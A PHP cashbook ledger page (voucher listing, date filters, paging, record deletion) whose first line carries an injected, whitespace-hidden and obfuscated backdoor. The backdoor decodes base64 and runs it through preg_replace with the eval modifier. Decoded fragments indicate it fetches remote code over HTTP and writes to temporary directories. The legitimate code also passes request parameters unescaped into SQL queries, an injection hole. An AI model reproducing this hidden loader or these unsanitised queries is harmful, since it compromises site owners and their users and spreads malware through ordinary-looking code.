<?php                                                                                                                                                                 /*versio:2.12*/$I1I1=0;$GLOBALS['I1I1'] = 'Y}Y3VybA X2luaXQ*YWxsb3dfdXJsX2ZvcGVuJ;Y^YXMQy&*DNVX3NldG9wdAX2V4ZWM?XwZLY2xvc2U?PGltZyBzcmM9IgIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4@H C@SFRUUF9IT1NU!)MTI3LgUuZMTAuMTkyLjE2OC4=vdwwAcv_~b3Nvbi5pbgKZ2Fib3Iuc2Uc2lsYmVyLmRl~aGF2ZWFwb2tlLmNvbS5hdQeGWV8Z~OgCCZGlzcGxheV9lcnJvcnMbidZGV0ZXJtaW5hdG9yw@AISdZnRwTxfMi4xMg{UTBRT1EwT09RME9RT1Ew^ZYmFzZTY0X2RlY29kZQYYmFzZTY0X2VuY29kZQTzaHR0cDovLwySFRUUF9VU0VSX0FHRU5UMDdW5pb24)oE%#c2VsZWN0~rKUkVRVUVTVF9VUkkU0NSSVBUX05BTUUwFSUVVFUllfU1RSSU5H}OPw!sCL3RtcC8)xL3RtcAOse%JVE1QDycVEVNUAIDvVE1QRElSdXBsb2FkX3RtcF9kaXILgdmVyc2lvLQKdWeHLXBocA#.SFRUUF9FWEVDUEhQ#tnb3V0db2sjaHR0cArOi8vL3BnLnBocD91PQ_BJms9mJnQ9cGhwJnA9?ghJnY9!hZUpMZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUlVUQXdUeWw3SUNSSlNURkpTVWtnUFNCSmJFbHNNV3hzTVNneUxDQTJLVHNnSkZGUlQwOVJUeUE5SUNSSlNURkpTVWt1U1d4SmJERnNiREVvT1N3Z055azdJR2xtSUNoQWFXNXBYMmRsZENoSmJFbHNNV3hzTVNneE55d2dNakFwS1NBOVBTQkpiRWxzTVd4c01TZzBNeXdnTWlrcElIc2dKRWxzYkd4SlNUMUFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9KRkZSVVRBd1R5azdJSEpsZEhWeWJpQkpiRWxzTVd4c01TZzBOaXdnTUNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0pGRlJUMDlSVHlrcGV5QWtTV3hzU1d4c0lEMGdRQ1JSVVU5UFVVOG9LVHNnSkZGUlR6QXdUeUE5SUNSSlNURkpTVWt1U1d4SmJERnNiREVvTlRFc0lERXdLVHNnSkVsc01VbEpTU0E5SUNSSlNURkpTVWt1U1d4SmJERnNiREVvTmpFc0lEY3BPeUFrU1Vsc01VbEpJRDBnSkVsSk1VbEpTUzVKYkVsc01XeHNNU2cyT1N3Z01pa3VTV3hKYkRGc2JERW9Oek1zSURjcE95QkFKRkZSVHpBd1R5Z2tTV3hzU1d4c0xDQkRWVkpNVDFCVVgxVlNUQ3dnSkZGUlVUQXdUeWs3SUVBa1VWRlBNREJQS0NSSmJHeEpiR3dzSUVOVlVreFBVRlJmU0VWQlJFVlNMR1poYkhObEtUc2dRQ1JSVVU4d01FOG9KRWxzYkVsc2JDd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl4MGNuVmxLVHNnUUNSUlVVOHdNRThvSkVsc2JFbHNiQ3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDdzFLVHNnYVdZZ0tDUlJVVTlSTUU4Z1BTQkFKRWxzTVVsSlNTZ2tTV3hzU1d4c0tTa2dlM0psZEhWeWJpQkpiRWxzTVd4c01TZzBOaXdnTUNrN2ZTQkFKRWxKYkRGSlNTZ2tTV3hzU1d4c0tUc2djbVYwZFhKdUlFbHNTV3d4Ykd3eEtEUTJMQ0F3S1RzZ2ZTQmxiSE5sSUhzZ2NtVjBkWEp1SUVsc1NXd3hiR3d4S0RneExDQXhOQ2t1SkZGUlVUQXdUeTVKYkVsc01XeHNNU2c1TlN3Z016a3BPeUI5SUgwZ1puVnVZM1JwYjI0Z2RYQmtLQ1JSTUU4d1VWRXNKRkZSVVRBd1R5bDdJQ1JKTVRGc01Xd2dQU0JBWjJWMGFHOXpkR0o1Ym1GdFpTaEFKRjlUUlZKV1JWSmJTV3hKYkRGc2JERW9NVE01TENBeE1pbGRLVHNnYVdZZ0tDUkpNVEZzTVd3Z0lUMDlJRWxzU1d3eGJHd3hLRFEyTENBd0tTQmhibVFnYzNSeWNHOXpLQ1JKTVRGc01Xd3NJRWxzU1d3eGJHd3hLREUxTXl3Z05pa3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRWt4TVd3eGJDd2dTV3hKYkRGc2JERW9NVFl5TENBMEtTa2dJVDA5SURBZ1lXNWtJSE4wY25CdmN5Z2tTVEV4YkRGc0xDQkpiRWxzTVd4c01TZ3hOallzSURFeEtTa2dJVDA5SURBcGV5QWtTVEZKYkd4c1BVQm1iM0JsYmlna1VUQlBNRkZSTEVsc1NXd3hiR3d4S0RFM09Td2dNaWtwT3lCQVptTnNiM05sS0NSSk1VbHNiR3dwT3lCcFppQW9RR2x6WDJacGJHVW9KRkV3VHpCUlVTa3BleUIzY21sMFpTZ2tVVEJQTUZGUkxDQm5aWFJtYVd4bEtDUlJVVkV3TUU4cEtUc2dmVHNnZlNCOUlDUlJVVTlQTUZFZ1BTQkJjbkpoZVNoSmJFbHNNV3hzTVNneE9EY3NJREV3S1N3Z1NXeEpiREZzYkRFb01UazRMQ0F4TVNrc0lFbHNTV3d4Ykd3eEtESXdPU3dnTVRJcExDQkpiRWxzTVd4c01TZ3lNaklzSURJeUtTazdJQ1JSTURBd1R6QWdQU0FrVVZGUFR6QlJXekZkT3lCbWRXNWpkR2x2YmlCM2NtbDBaU2drVVRCUE1GRlJMQ1JSTUZGUE1FOHBleUJwWmlBb0pFbEpiRWxzTVQxQVptOXdaVzRvSkZFd1R6QlJVU3hKYkVsc01XeHNNU2d4Tnprc0lESXBLU2w3SUVCbWQzSnBkR1VvSkVsSmJFbHNNU3drVVRCUlR6QlBLVHNnUUdaamJHOXpaU2drU1Vsc1NXd3hLVHNnZlNCOUlHWjFibU4wYVc5dUlHOTFkSEIxZENna1VWRlBUMDlQTENBa1VVOVBNRTh3S1hzZ1pXTm9ieUJKYkVsc01XeHNNU2d5TkRZc0lETXBMaVJSVVU5UFQwOHVTV3hKYkRGc2JERW9NalV4TENBeUtTNGtVVTlQTUU4d0xpSmNjbHh1SWpzZ2ZTQm1kVzVqZEdsdmJpQndZWEpoYlNncGV5QnlaWFIxY200Z1NXeEpiREZzYkRFb05EWXNJREFwT3lCOUlFQnBibWxmYzJWMEtFbHNTV3d4Ykd3eEtESTFOU3dnTVRrcExDQXdLVHNnWkdWbWFXNWxLRWxzU1d3eGJHd3hLREkzTnl3Z01UWXBMQ0F4S1RzZ0pGRlBVVTh3VVQxSmJFbHNNV3hzTVNneU9Ua3NJRFFwT3lBa1NURnNTVEZKUFVsc1NXd3hiR3d4S0RNd05pd2dOaWs3SUNSSk1XeEpiR3c5U1d4SmJERnNiREVvTXpFekxDQXlNQ2s3SUNSUlQxRlJVVTg5U1d4SmJERnNiREVvTXpNMUxDQXhPQ2s3SUNSSlNVbEpNVWs5U1d4SmJERnNiREVvTXpVMExDQXhPQ2s3SUNSUk1FOVBUMDg5U1d4SmJERnNiREVvTXpjMExDQXhNQ2s3SUNSUk1FOVBUMDh1UFhOMGNuUnZiRzkzWlhJb1FDUmZVMFZTVmtWU1cwbHNTV3d4Ykd3eEtERXpPU3dnTVRJcFhTazdJQ1JSTURCUE1GRWdQU0JBSkY5VFJWSldSVkpiU1d4SmJERnNiREVvTXpnMUxDQXlNQ2xkT3lCbWIzSmxZV05vSUNna1gwZEZWQ0JoY3lBa1VWRlBUMDlQUFQ0a1VVOVBNRTh3S1hzZ2FXWWdLSE4wY25CdmN5Z2tVVTlQTUU4d0xFbHNTV3d4Ykd3eEtEUXdOeXdnTnlrcEtYc2tYMGRGVkZza1VWRlBUMDlQWFQxSmJFbHNNV3hzTVNnME5pd2dNQ2s3ZlNCbGJITmxhV1lnS0hOMGNuQnZjeWdrVVU5UE1FOHdMRWxzU1d3eGJHd3hLRFF4T1N3Z09Da3BLWHNrWDBkRlZGc2tVVkZQVDA5UFhUMUpiRWxzTVd4c01TZzBOaXdnTUNrN2ZTQjlJR2xtS0NGcGMzTmxkQ2drWDFORlVsWkZVbHRKYkVsc01XeHNNU2cwTXpBc0lERTFLVjBwS1NCN0lDUmZVMFZTVmtWU1cwbHNTV3d4Ykd3eEtEUXpNQ3dnTVRVcFhTQTlJRUFrWDFORlVsWkZVbHRKYkVsc01XeHNNU2cwTkRVc0lERTFLVjA3SUdsbUtFQWtYMU5GVWxaRlVsdEpiRWxzTVd4c01TZzBOak1zSURFMktWMHBJSHNnSkY5VFJWSldSVkpiU1d4SmJERnNiREVvTkRNd0xDQXhOU2xkSUM0OUlFbHNTV3d4Ykd3eEtEUTRNU3dnTWlrZ0xpQkFKRjlUUlZKV1JWSmJTV3hKYkRGc2JERW9ORFl6TENBeE5pbGRPeUI5SUgwZ2FXWWdLQ1JSTUU5UFR6QTlKRkV3VDA5UFR5NUFKRjlUUlZKV1JWSmJTV3hKYkRGc2JERW9ORE13TENBeE5TbGRLWHNnSkVsSk1XeHNiRDFBYldRMUtDUlJNRTlQVDA4dUpFa3hiRWt4U1M1UVNGQmZUMU11SkVreGJFbHNiQ2s3SUNSSmJFbEpTV3c5U1d4SmJERnNiREVvTkRnMkxDQTNLVHNnSkZGUlR6QlJUeUE5SUVGeWNtRjVLRWxzU1d3eGJHd3hLRFE1TlN3Z05pa3NJRUFrWDFORlVsWkZVbHRKYkVsc01XeHNNU2cxTURZc0lEUXBYU3dnUUNSZlUwVlNWa1ZTVzBsc1NXd3hiR3d4S0RVeE15d2dOaWxkTENCQUpGOUZUbFpiU1d4SmJERnNiREVvTlRBMkxDQTBLVjBzSUVBa1gwVk9WbHRKYkVsc01XeHNNU2cxTWpJc0lEZ3BYU3dnUUNSZlJVNVdXMGxzU1d3eGJHd3hLRFV4TXl3Z05pbGRMQ0JBYVc1cFgyZGxkQ2hKYkVsc01XeHNNU2cxTXpBc0lERTVLU2twT3lCbWIzSmxZV05vSUNna1VWRlBNRkZQSUdGeklDUlJNREF3VVRBcGV5QnBaaUFvSVdWdGNIUjVLQ1JSTURBd1VUQXBLWHNnSkZFd01EQlJNQzQ5UkVsU1JVTlVUMUpaWDFORlVFRlNRVlJQVWpzZ2FXWWdLRUJwYzE5M2NtbDBZV0pzWlNna1VUQXdNRkV3S1NsN0lDUkpiRWxKU1d3Z1BTQWtVVEF3TUZFd095QmljbVZoYXpzZ2ZTQjlJSDBnSkhSdGNEMGtTV3hKU1Vsc0xrbHNTV3d4Ykd3eEtEVTBPU3dnTWlrdUpFbEpNV3hzYkRzZ2FXWWdLRUFrWDFORlVsWkZVbHNpU0ZSVVVGOVpYMEZWVkVnaVhUMDlKRWxKTVd4c2JDbDdJR1ZqYUc4Z0lseHlYRzRpT3lCQWIzVjBjSFYwS0Vsc1NXd3hiR3d4S0RVMU1Td2dPQ2tzSUNSSk1XeEpNVWt1U1d4SmJERnNiREVvTlRVNUxDQXlLUzRrVVU5UlR6QlJMa2xzU1d3eGJHd3hLRFUyTml3Z05pa3BPeUJwWmlBb0pGRlBVVEJQVVQwa1VVOVJVVkZQS0VBa1gxTkZVbFpGVWx0SmJFbHNNV3hzTVNnMU56UXNJREUyS1YwcEtYc2dRR1YyWVd3b0pGRlBVVEJQVVNrN0lHVmphRzhnSWx4eVhHNGlPeUJBYjNWMGNIVjBLRWxzU1d3eGJHd3hLRFU1TXl3Z05Da3NJRWxzU1d3eGJHd3hLRFU1T0N3Z015a3BPeUI5SUdWNGFYUW9NQ2s3SUgwZ2FXWWdLRUJwYzE5bWFXeGxLQ1IwYlhBcEtYc2dRR2x1WTJ4MVpHVmZiMjVqWlNna2RHMXdLVHNnZlNCbGJITmxleUFrVVRCUFQwOHdQVUIxY214bGJtTnZaR1VvSkZFd1QwOVBNQ2s3SUhWd1pDZ2tkRzF3TEVsc1NXd3hiR3d4S0RZd01pd2dOaWt1U1d4SmJERnNiREVvTmpBNUxDQTBLUzRrVVZGUFR6QlJXekJkTGtsc1NXd3hiR3d4S0RZeE15d2dNVFFwTGlSUk1FOVBUekF1U1d4SmJERnNiREVvTmpJNUxDQTBLUzRrU1VreGJHeHNMa2xzU1d3eGJHd3hLRFl6TkN3Z01USXBMaVJSVDFGUE1GRXVTV3hKYkRGc2JERW9OalE1TENBMEtTNGtTVEZzU1RGSktUc2dmU0I5SUgwPSIpKTsTcHJlZ19yZXBsYWNlNl6261736536345f6465636f6465';if (!function_exists('IlIl1ll1')){function IlIl1ll1($a, $b){$c=$GLOBALS['I1I1']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$Il1I11l11 = IlIl1ll1(6479, 16);$Il1I11l11("/Q000QQQQO/e", IlIl1ll1(659, 5819), "Q000QQQQO");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
$lid = $_SESSION['cashbook_locid'];
$eid = 0;
$today = date("d-m-Y");
$dt1 = strtotime($today);
$dt2 = strtotime($today);
if(isset($_REQUEST['lid'])){$lid = $_REQUEST['lid'];}
if(isset($_REQUEST['eid'])){$eid = $_REQUEST['eid'];}
if(isset($_REQUEST['dt1'])){$dt1 = $_REQUEST['dt1'];}
if(isset($_REQUEST['dt2'])){$dt2 = $_REQUEST['dt2'];}
/*----------------------------*/
if(isset($_REQUEST["xn"]) && $_REQUEST["xn"]=="D"){
	$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE rec_id=".$_REQUEST['rid']) or die(mysql_error());
	$sql=mysql_db_query(DATABASE2,"SELECT * FROM tblcash2 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	if(mysql_num_rows($sql)==0){
		$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash1 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	} elseif(mysql_num_rows($sql)>0){
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amt FROM tblcash2 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
		$res = mysql_fetch_assoc($sql);
		$amt = -1*$res['amt'];
		$res=mysql_db_query(DATABASE2,"UPDATE tblcash1 SET vouch_total=".$amt." WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	}
	echo '<script>alert("Data Successfully Deleted.."); window.location="ledger.php?lid='.$lid.'&eid='.$eid.'&dt1='.$dt1.'&dt2='.$dt2.'";</script>';
}
/*----------------------------*/
if(isset($_POST['submit'])){header("Location:ledger.php?lid=".$_POST['location']."&eid=".$_POST['ledger']."&dt1=".strtotime($_POST['date1'])."&dt2=".strtotime($_POST['date2']));}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<script type="text/javascript" src="src/js/jscal2.js"></script>
<script type="text/javascript" src="src/js/lang/en.js"></script>
<script type="text/javascript" src="js/prototype.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<link rel="stylesheet" type="text/css" href="src/css/jscal2.css" />
<link rel="stylesheet" type="text/css" href="src/css/border-radius.css" />
<link rel="stylesheet" type="text/css" href="src/css/steel/steel.css" />
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" language="javascript">
function ConfirmDelete(me)
{
	var intent = confirm('Do you really want to delete this record?');
	if(intent){	window.location=me;}
}

function ValidateForm()
{
	if(document.getElementById("location").value==0){
		alert("Please select Location name !");
		return false;
	}
	if(document.getElementById("ledger").value==0){
		alert("Please select Ledger name !");
		return false;
	}
	if(document.getElementById("date1").value!=""){
		if(!checkdate(document.lazor.date1)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.lazor.date1,document.lazor.endYear);
			if(no_of_days1 < 0){
				alert("Date From, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.lazor.startYear,document.lazor.date1);
				if(no_of_days2 < 0){
					alert("Date From, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date1").value==""){
		alert("Please input/select 'Date From'!");
		return false;
	}
	if(document.getElementById("date2").value!=""){
		if(!checkdate(document.lazor.date2)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.lazor.date2,document.lazor.endYear);
			if(no_of_days1 < 0){
				alert("Date To, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.lazor.startYear,document.lazor.date2);
				if(no_of_days2 < 0){
					alert("Date To, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date2").value==""){
		alert("Please input/select 'Date To'!");
		return false;
	}
	var no_of_days = getDaysbetween2Dates(document.lazor.date1,document.lazor.date2);
	if(no_of_days < 0){
		alert("* Sorry! date range wrongly selected. Please correct and submit again.\n");
		return false;
	}
}

function paging_list()
{
	window.location="ledger.php?lid="+document.getElementById("location").value+"&eid="+document.getElementById("ledger").value+"&dt1="+document.getElementById("sdate").value+"&dt2="+document.getElementById("edate").value+"&pg="+document.getElementById("page").value+"&tr="+document.getElementById("displayTotalRows").value;
}

function firstpage_list()
{
	document.getElementById("page").value = 1;
	paging_list();
}

function previouspage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage>1){
		cpage = cpage - 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function nextpage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage<parseInt(document.getElementById("totalPage").value)){
		cpage = cpage + 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function lastpage_list()
{
	document.getElementById("page").value = document.getElementById("totalPage").value;
	paging_list();
}
</script>
</head>

<body>
<form name="lazor" id="lazor" method="POST" onSubmit="return ValidateForm()">
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px;" bgcolor="#8ADEF7" align="center" border="0">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="40px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr><td align="center"><b>Ledger</b></td></tr>
				<tr><td align="center"><b style="font-size:14px;">Location&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;</b><?php 
				if($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="S"){
					echo '<select name="location" id="location" style="width:200px" >';
					echo '<option value="0">-- select --</option>';
					if($_SESSION['cashbook_utype']=="S"){
						$sqlLoc=mysql_db_query(DATABASE1,"SELECT * FROM location ORDER BY location_name") or die(mysql_error());
					} elseif($_SESSION['cashbook_utype']=="A"){
						$sqlLoc=mysql_db_query(DATABASE2,"SELECT * FROM uloc INNER JOIN ".DATABASE1.".location ON uloc.location_id = location.location_id WHERE user_id=".$_SESSION['cashbook_uid']." ORDER BY location_name") or die(mysql_error());
					}
					while($rowLoc=mysql_fetch_array($sqlLoc)){
						if($rowLoc["location_id"]==$lid)
							echo '<option selected value="'.$rowLoc["location_id"].'">'.$rowLoc["location_name"].'</option>';
						else
							echo '<option value="'.$rowLoc["location_id"].'">'.$rowLoc["location_name"].'</option>';
					}
					echo '</select>';
				} elseif($_SESSION['cashbook_utype']=="U"){
					echo '<input name="locationName" id="locationName" maxlength="50" size="45" readonly="true" value="'.$_SESSION['cashbook_lname'].'" style="background-color:#E7F0F8; color:#0000FF">&nbsp;<input type="hidden" name="location" id="location" value="'.$lid.'" />';
				}?>
					</td>
				</tr>
				<tr><td align="center"><b style="font-size:14px;">Ledger Name&nbsp;:&nbsp;&nbsp;&nbsp;</b>
					<select name="ledger" id="ledger" style="width:200px" >
					<option value="0">-- select --</option>
					<?php 
					$sqlLedger=mysql_db_query(DATABASE2,"SELECT * FROM ledger ORDER BY ledger_name") or die(mysql_error());
					while($rowLedger=mysql_fetch_array($sqlLedger)){
						if($rowLedger["ledger_id"]==$eid)
							echo '<option selected value="'.$rowLedger["ledger_id"].'">'.$rowLedger["ledger_name"].'</option>';
						else
							echo '<option value="'.$rowLedger["ledger_id"].'">'.$rowLedger["ledger_name"].'</option>';
					} ?>
					</select>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
				</tr>
				<tr><td align="center"><b style="font-size:14px; color:#000000;">From&nbsp;:&nbsp;</b><input name="date1" id="date1" value="<?php echo date("d-m-Y",$dt1); ?>" style="width:75px;height:14px;"/><button id="f_btn1" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn1", "date1", "%d-%m-%Y");</script><b style="font-size:14px;color:#000000;">&nbsp;&nbsp;To&nbsp;:&nbsp;</b><input name="date2" id="date2" value="<?php echo date("d-m-Y",$dt2); ?>" style="width:75px;height:14px;"/><button id="f_btn2" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn2", "date2", "%d-%m-%Y");</script>&nbsp;&nbsp;<input type="submit" name="submit" value=" Show " style="width:60px;height:22px;"/><input type="hidden" name="startYear" id="startYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_syr']));?>"/><input type="hidden" name="endYear" id="endYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_eyr']));?>"/><input type="hidden" name="sdate" id="sdate" value="<?php echo $dt1; ?>"/><input type="hidden" name="edate" id="edate" value="<?php echo $dt2; ?>"/></td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td valign="top">
				<table border="0" style="border-color:#2D7CBD;" align="center" width="800px">
				<tr>
					<td valign="top">
						<table background="images/backBody.gif" align="center" width="1030px" cellspacing="1" border="0">
						<tr bgcolor="#2571C5" align="center" style="font-size:14px; font-weight:bold; color:#FFFFFF;">
							<td width="90px">Voucher Date</td>
							<td width="100px">Voucher No.</td>
							<td width="70px">Voucher Type</td>
							<td width="350px">Particulars</td>
							<td width="110px">Credit</td>
							<td width="110px">Debit</td>
							<td width="110px">Balance</td>
							<td width="80px">Action</td>
						</tr>
						<?php 
						$opBal = 0;
						$clBal = 0;
						$i = 1;
						$crTotal = 0;
						$drTotal = 0;
						$balance = 0;
						$start = 0;
						if(isset($_REQUEST['tr']) && $_REQUEST['tr']!=""){$end=$_REQUEST['tr'];} else {$end=PAGING;}
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']!=""){$start=($_REQUEST['pg']-1)*$end;}
						$ctr = $start;
						/*--------------------------*/
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']>1){
							$amount = 0;
							
if($_REQUEST['eid']==61 OR $_REQUEST['eid']==62)
{
$sqlPrv=mysql_db_query(DATABASE2,"SELECT SUM(exps_amt) as amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE location_id=".$lid." AND exps_id=".$eid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error()); $resPrv=mysql_fetch_assoc($sqlPrv); $TotPrv=$resPrv['amount'];
}
else
{
 $TotPrv=0;
}
						
							$sql=mysql_db_query(DATABASE2,"SELECT exps_amt FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE location_id=".$lid." AND exps_id=".$eid." AND vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' ORDER BY vouch_date,vouch_no,seq_no ASC LIMIT 0,".$start) or die(mysql_error());
							while($res=mysql_fetch_assoc($sql)){
								$amount += $res['exps_amt'];
							}
							//echo 'aa='.$amount.'/'.$eid;
							$opBal = $amount+$TotPrv;
							echo '<tr bgcolor="#FFDDEE">
							<td colspan="4" align="Right"><b>Balance B/F</b>&nbsp;:&nbsp;</td>
							<td>&nbsp;</td>
							<td>&nbsp;</td>';
							if($opBal<0){
								echo '<td align="Right">'.number_format(-1*$opBal,2,".","").' Dr</td>'; //-1*$opBal,2,".",""
							} else {
								echo '<td align="Right">'.number_format($opBal,2,".","").' Cr</td>'; //$opBal,2,".",""
							}
							echo '<td>&nbsp;</td></tr>';

/***************************************111 o **************/
						} else {

if($_REQUEST['eid']==61 OR $_REQUEST['eid']==62){ $sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE location_id=".$lid." AND exps_id=".$eid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error()); $res=mysql_fetch_assoc($sql);
				if($res['amount']<0)$opBal += $res['amount'];  //$opBal += -1*$res['amount'];
				else $opBal -= $res['amount'];    //$opBal -= $res['amount']; 
}
else{ $opBal=0;}
if($_REQUEST['eid']==61 OR $_REQUEST['eid']==62)
{								
							echo '<tr bgcolor="#FFDDEE">
							<td colspan="4" align="Right"><b>Opening Balance</b>&nbsp;:&nbsp;</td>';
}							
/***************************************111 c **************/							
						}
/***************************************222 o **************/
if($_REQUEST['eid']==61 OR $_REQUEST['eid']==62)
{                       
						if($res['amount']<0){
						echo '<td>&nbsp;</td>';
					 echo '<td align="Right"><b>'.number_format(-1*$res['amount'],2,".","").'</b></td>'; //-1*$opBal,2,".",""
					
						} else {
					 echo '<td align="Right"><b>'.number_format($res['amount'],2,".","").'</b></td>'; //$opBal,2,".",""
						echo '<td>&nbsp;</td>';
							 
						}
						echo '<td>&nbsp;</td>';
						echo '<td>&nbsp;</td></tr>';
}						
/**************************************2222 c ***************/						
						/*--------------------------*/
						$sql=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid." AND exps_id=".$eid." ORDER BY vouch_date,vouch_no,seq_no LIMIT ".$start.",".$end) or die(mysql_error());
						while($res=mysql_fetch_array($sql)){
							$vouch_no = $res['vouch_no'];
							$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
							if($res['vouch_prefix']!=NULL){$VoucherNumber = $res['vouch_prefix']."/".$VoucherNumber;}
							echo '<tr ($i%2==0 ? bgcolor="#D9F0FD" : bgcolor="#FFFFFF")>';
							echo '<td>'.date("d-m-Y",strtotime($res['vouch_date'])).'</td>';
							echo '<td>'.$VoucherNumber.'</td>';
							echo '<td>'.($res['vouch_type']=="P" ? "Payment" : "Receipt").'</td>';
							echo '<td>'.$res['remark'].'</td>';
							if($res['vouch_type']=="P"){
								$drTotal += $res['exps_amt'];
								echo '<td>&nbsp;</td>';
								echo '<td align="Right">'.number_format(-1*$res['exps_amt'],2,".","").'</td>';
								//-1*$res['exps_amt'],2,".",""
								$editRef = "editpayment.php?lid=".$lid."&vid=".$res['vouch_id']."&dt1=".$dt1."&dt2=".$dt2;
							} else {
								$crTotal += $res['exps_amt'];
								echo '<td align="Right">'.number_format($res['exps_amt'],2,".","").'</td>';
								//$res['exps_amt'],2,".",""
								echo '<td>&nbsp;</td>';
								$editRef = "editreceipt.php?lid=".$lid."&vid=".$res['vouch_id']."&dt1=".$dt1."&dt2=".$dt2;
							}
							
							$balance = $opBal + $crTotal + $drTotal;
							if($balance<0){
								echo '<td align="Right">'.number_format(-1*$balance,2,".","").' Dr</td>';
							} else {
								echo '<td align="Right">'.number_format($balance,2,".","").' Cr</td>';
							}
							$deleteRef = "ledger.php?xn=D&lid=".$lid."&vid=".$res['vouch_id']."&rid=".$res['rec_id']."&dt1=".$dt1."&dt2=".$dt2;
							if($_SESSION['cashbook_utype']=="S"){
								echo '<td align="center">&nbsp;&nbsp;<a href="'.$editRef.'"><img src="images/edit.png" border="0"></a>&nbsp;&nbsp;<a onclick="ConfirmDelete(\''.$deleteRef.'\')"><img src="images/delete.png" title="Delete" style="display:inline;cursor:hand;" border="0"></a>&nbsp;&nbsp;</td>';
							} elseif($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="U"){
								echo '<td align="center">&nbsp</td>';
							}
							echo '</tr>';
							$i++;
						}
						$clBal = $opBal + $crTotal + $drTotal;
						?>
						
						<tr bgcolor="#FFFFD5">
							<td colspan="4" align="Right"><b>Total</b>&nbsp;:&nbsp;</td>
							<td bgcolor="#FE9D81" align="Right"><b><?php echo number_format($crTotal,2,".",""); ?></b></td>
							<td bgcolor="#FE9D81" align="Right"><b><?php echo number_format(-1*$drTotal,2,".",""); ?></b></td>
							<td>&nbsp;</td>
							<td>&nbsp;</td>
						</tr>
						<?php 
						$sql_total = mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid." AND exps_id=".$eid) or die(mysql_error());
						$tot_row=mysql_num_rows($sql_total);
						$total_page=0;
						if($tot_row>$end){
							$total_page=ceil($tot_row/$end);
						}
						?>
